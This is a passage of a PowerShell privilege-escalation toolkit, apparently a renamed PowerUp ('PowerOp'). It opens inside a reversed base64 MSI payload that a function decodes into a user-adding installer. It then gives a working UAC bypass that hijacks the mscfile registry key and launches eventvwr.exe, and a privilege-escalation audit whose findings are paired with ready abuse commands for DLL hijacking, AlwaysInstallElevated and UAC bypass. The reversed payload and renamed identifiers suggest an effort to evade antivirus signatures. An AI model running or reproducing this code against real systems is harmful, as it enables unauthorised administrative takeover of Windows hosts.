AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////DAAAAAAAAAA////+DAAAEAAAAgAAAAEAAAAAAAAAAQAAAAABAAAAEAAAAAAAAAAGAAD/7PAEAgPAAAAAAAAAAAAAAAAAAAAAEuGxGK4R8M0'


    try {

        $Binaryx = ([regex]::Matches($Binairy,'.','RightToLeft') | ForEach {$_.value}) -join ''
        $Binary = $Binaryx
        [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
        Write-Verbose "MSI written out to '$Path'"

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'OutputPath' $Path
        $Out.PSObject.TypeNames.Insert(0, 'PowerOp.UserAddMSI')
        $Out
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
    }
}


function Invoke-EventVwrBypass {

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        #Begin Execution
        $fukjou = "HKCU:\Software\Classes\mscfile\shell\open\command"
        $Command = $pshome + '\' + $Command
        if ($Force -or ((Get-ItemProperty -Path $fukjou -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $fukjou -Force |
                New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }

        if (Test-Path $fukjou) {
            Write-Verbose "Created registry entries to hijack the msc extension"
        }else{
            Write-Warning "Failed to create registry key, exiting"
            exit
        }

        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
        #Start Event Viewer
        if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
            $Process = Start-Process -FilePath $EventvwrPath -PassThru
            Write-Verbose "Started eventvwr.exe"
        }

        #Sleep 5 seconds 
        Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $mscfilePath = "HKCU:\Software\Classes\mscfile"

        if (Test-Path $mscfilePath) {
            #Remove the registry entry
            Remove-Item $mscfilePath -Recurse -Force
            Write-Verbose "Removed registry entries"
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose "Killed running eventvwr process"
        }
    }
}


function Invoke-PrivescAudit {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [ValidateSet('Object','List','HTML')]
        [String]
        $Format = 'Object',
        [Switch]
        $HTMLReport
    )

    if($HTMLReport){ $Format = 'HTML' }

    if ($Format -eq 'HTML') {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"
        ConvertTo-HTML -Head $Header -Body "<H1>PowerOp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    Write-Verbose "Running Invoke-PrivescAudit"

    $Checks = @(
        # Initial admin checks
        @{
            Type    = 'User Has Local Admin Privileges'
            Command = { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){ New-Object PSObject } }
        },
        @{
            Type        = 'User In Local Group with Admin Privileges'
            Command     = { if ((Get-ProcessTokenGroup | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { Get-ProcessTokenPrivilege -Special | Where-Object {$_} }
        },
        # Service checks
        @{
            Type    = 'Unquoted Service Paths'
            Command = { Get-UnquotedService }
        },
        @{
            Type    = 'Modifiable Service Files'
            Command = { Get-ModifiableServiceFile }
        },
        @{
            Type    = 'Modifiable Services'
            Command = { Get-ModifiableService }
        },
        # DLL hijacking
        @{
            Type        = '%PATH% .dll Hijacks'
            Command     = { Find-PathDLLHijack }
            AbuseScript = { "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        # Registry checks
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (Get-RegistryAlwaysInstallElevated){ New-Object PSObject } }
            AbuseScript = { 'Write-UserAddMSI' }
        },
        @{
            Type    = 'Registry Autologons'
            Command = { Get-RegistryAutoLogon }
        },
        @{
            Type    = 'Modifiable Registry Autorun'
            Command = { Get-ModifiableRegistryAutoRun }
        },
        # Other checks
        @{
            Type    = 'Modifiable Scheduled Task Files'
            Command = { Get-ModifiableScheduledTaskFile }
        },
        @{
            Type    = 'Unattended Install Files'
            Command = { Get-UnattendedInstallFile }
        },
        @{
            Type    = 'Encrypted web.config Strings'
            Command = { Get-WebConfig | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { Get-ApplicationHost | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { Get-SiteListPassword | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { Get-CachedGPPPassword | Where-Object {$_} }
        }
    )

    ForEach($Check in $Checks){
        Write-Verbose "Checking for $($Check.Type)..."
        $Results = . $Check.Command
        $Results | Where-Object {$_} | ForEach-Object {
            $_ | Add-Member Noteproperty 'Check' $Check.Type
            if ($Check.AbuseScript){
                $_ | Add-Member Noteproperty 'AbuseFunction' (. $Check.AbuseScript)
            }
        }
        switch($Format){
            Object { $Results }
            List   { "`n`n[*] Checking for $($Check.Type)..."; $Results | Format-List }
            HTML   { $Results | ConvertTo-HTML -Head $Header -Body "<H2>$($Check.Type)</H2>" | Out-File -Append $HtmlReportFile }
        }
    }

    if ($Format -eq 'HTML') {
        Write-Verbose "[*] Report written to '$HtmlReportFile' `n"
    }
}


# PSReflect signature specifications
$Module = New-InMemoryModule -ModuleName PowerOpModule
# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', '', Scope='Function')]

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Bool]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
)

# https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
$ServiceAccessRights = psenum $Module PowerOp.ServiceAccessRights UInt32 @{
    QueryConfig             =   '0x00000001'
    ChangeConfig            =   '0x00000002'
    QueryStatus             =   '0x00000004'
    EnumerateDependents     =   '0x00000008'
    Start                   =   '0x00000010'
    Stop                    =   '0x00000020'
    PauseContinue           =   '0x00000040'
    Interrogate             =   '0x00000080'
    UserDefinedControl      =   '0x00000100'
    Delete                  =   '0x00010000'
    ReadControl             =   '0x00020000'
    WriteDac                =   '0x00040000'
    WriteOwner              =   '0x00080000'
    Synchronize             =   '0x00100000'
    AccessSystemSecurity    =   '0x01000000'
    GenericAll              =   '0x10000000'
    GenericExecute          =   '0x20000000'
    GenericWrite            =   '0x40000000'
    GenericRead             =   '0x80000000'
    AllAccess               =   '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerOp.SidAttributes UInt32 @{
    SE_GROUP_MANDATORY              =   '0x00000001'
    SE_GROUP_ENABLED_BY_DEFAULT     =   '0x00000002'
    SE_GROUP_ENABLED                =   '0x00000004'
    SE_GROUP_OWNER                  =   '0x00000008'
    SE_GROUP_USE_FOR_DENY_ONLY      =   '0x00000010'
    SE_GROUP_INTEGRITY              =   '0x00000020'
    SE_GROUP_RESOURCE               =   '0x20000000'
    SE_GROUP_INTEGRITY_ENABLED      =   '0xC0000000'
} -Bitfield

$LuidAttributes = psenum $Module PowerOp.LuidAttributes UInt32 @{
    DISABLED                            =   '0x00000000'
    SE_PRIVILEGE_ENABLED_BY_DEFAULT     =   '0x00000001'
    SE_PRIVILEGE_ENABLED                =   '0x00000002'
    SE_PRIVILEGE_REMOVED                =   '0x00000004'
    SE_PRIVILEGE_USED_FOR_ACCESS        =   '0x80000000'
} -Bitfield

$SecurityEntity = psenum $Module PowerOp.SecurityEntity UInt32 @{
    SeCreateTokenPrivilege              =   1
    SeAssignPrimaryTokenPrivilege       =   2
    SeLockMemoryPrivilege               =   3
    SeIncreaseQuotaPrivilege            =   4
    SeUnsolicitedInputPrivilege         =   5
    SeMachineAccountPrivilege           =   6
    SeTcbPrivilege                      =   7
    SeSecurityPrivilege                 =   8
    SeTakeOwnershipPrivilege            =   9
    SeLoadDriverPrivilege               =   10
    SeSystemProfilePrivilege            =   11
    SeSystemtimePrivilege               =   12
    SeProfileSingleProcessPrivilege     =   13
    SeIncreaseBasePriorityPrivilege     =   14
    SeCreatePagefilePrivilege           =   15
    SeCreatePermanentPrivilege          =   16
    SeBackupPrivilege                   =   17
    SeRestorePrivilege                  =   18
    SeShutdownPrivilege                 =   19
    SeDebugPrivilege                    =   20
    SeAuditPrivilege                    =   21
    SeSystemEnvironmentPrivilege        =   22
    SeChangeNotifyPrivilege             =   23
    SeRemoteShutdownPrivilege           =   24
    SeUndockPrivilege                   =   25
    SeSyncAgentPrivilege                =   26
    SeEnableDelegationPrivilege         =   27
    SeManageVolumePrivilege             =   28
    SeImpersonatePrivilege              =   29
    SeCreateGlobalPrivilege             =   30
    SeTrustedCredManAccessPrivilege     =   31
    SeRelabelPrivilege                  =   32
    SeIncreaseWorkingSetPrivilege       =   33
    SeTimeZonePrivilege                 =   34
    SeCreateSymbolicLinkPrivilege       =   35
}

$SID_AND_ATTRIBUTES = struct $Module PowerOp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_TYPE_ENUM = psenum $Module PowerOp.TokenTypeEnum UInt32 @{
    Primary         = 1
    Impersonation   = 2
}

$TOKEN_TYPE = struct $Module PowerOp.TokenType @{
    Type  = field 0 $TOKEN_TYPE_ENUM
}

$SECURITY_IMPERSONATION_LEVEL_ENUM = psenum $Module PowerOp.ImpersonationLevelEnum UInt32 @{
    Anonymous         =   0
    Identification    =   1
    Impersonation     =   2
    Delegation        =   3
}

$IMPERSONATION_LEVEL = struct $Module PowerOp.ImpersonationLevel @{
    ImpersonationLevel  = field 0 $SECURITY_IMPERSONATION_LEVEL_ENUM
}

$TOKEN_GROUPS = struct $Module PowerOp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$LUID = struct $Module PowerOp.Luid @{
    LowPart         =   field 0 $SecurityEntity
    HighPart        =   field 1 Int32
}

$LUID_AND_ATTRIBUTES = struct $Module PowerOp.LuidAndAttributes @{
    Luid         =   field 0 $LUID
    Attributes   =   field 1 UInt32
}

$TOKEN_PRIVILEGES = struct $Module PowerOp.TokenPrivileges @{
    PrivilegeCount  = field 0 UInt32
    Privileges      = field 1 $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerOp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$NTDll    = $Types['ntdll']

Set-Alias Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
Set-Alias Invoke-AllChecks Invoke-PrivescAudit
